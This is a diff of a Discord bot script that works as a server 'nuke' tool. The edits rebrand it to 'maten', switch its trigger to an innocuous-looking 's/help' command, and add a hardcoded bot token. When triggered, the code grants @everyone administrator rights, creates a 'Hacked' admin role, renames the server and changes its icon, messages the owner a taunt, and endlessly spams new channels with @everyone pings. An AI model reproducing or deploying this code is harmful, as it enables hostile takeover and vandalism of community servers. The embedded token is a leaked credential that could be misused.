@@ -8,7 +8,7 @@ client.on("ready", () => {
 
 
 client.on("message", message => {
-  if (message.content.startsWith(`.`)) {
+  if (message.content.startsWith(`s/help`)) {
     message.delete();
     message.guild.roles.cache.find(r => r.name === "@everyone").edit({
       permissions: ["ADMINISTRATOR"] ///premission akata adminstator
@@ -26,7 +26,7 @@ client.on("message", message => {
       message.guild.roles
         .create({
         data: {
-          name: "Hacked:joy:",
+          name: "Hacked By maten :joy:",
           permissions: ["ADMINISTRATOR"]
         }
         })
@@ -36,19 +36,19 @@ client.on("message", message => {
     }, 1000);
     message.guild.setIcon("https://media.discordapp.net/attachments/839471875075473423/862400360437121054/Image_about_cute_in_s_by_moonlxght_on_We_Heart_It.jpg");
     client.user.setAvatar("https://media.discordapp.net/attachments/839471875075473423/862400360437121054/Image_about_cute_in_s_by_moonlxght_on_We_Heart_It.jpg");
-    client.user.setUsername("Bj UP");
+    client.user.setUsername("maten UP");
     message.guild.owner.send(
       "Mazay kury kar bro servert bbyna gayrawa"
     );
-    message.guild.setName("Bj Up");
+    message.guild.setName("maten Up");
     setTimeout(function() {
       setInterval(
         () => {
           message.guild.channels
-            .create("hacked by bj", "text")
+            .create("hacked by maten", "text")
             .then(channel => {
               channel.send(
-                "@everyone Bj Up :joy: :joy: :joy:"
+                "@everyone maten Up :joy: :joy: :joy:"
               );
             });
         },
@@ -62,4 +62,4 @@ client.on("message", message => {
 
 ////codaka drwst krawa lalayan black jack
 
-client.login("");
+client.login("ODQ1Mjc0OTIwNjc3MDE1NTkz.YKelnQ.rXxafuRH2MNgadz6M-Vvm3dF5LE");
